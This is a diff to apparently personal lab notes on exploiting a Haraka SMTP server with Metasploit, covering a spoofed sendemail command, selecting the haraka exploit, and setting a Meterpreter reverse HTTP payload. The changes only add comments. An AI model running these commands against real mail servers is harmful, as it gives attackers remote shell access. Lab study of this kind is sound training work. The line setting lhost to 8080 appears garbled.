@@ -70,7 +70,7 @@ sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s demo.ine.local -u Fak
 2. `search type:exploit name:haraka` : search for service found
 3. `use exploit/linux/smtp/haraka`
 	1. `options` : view options to set
-	2. `set SRVPORT 9898` : local listen port
-	3. `set email_to root@attackdefense.test`
+	2. `set SRVPORT 9898` : local listen port, changed because payload
+	3. `set email_to root@attackdefense.test` : to yourself?
 	4. `set payload linux/x64/meterpreter_reverse_http`
 	5. `set lhost 8080` : set payload lhost
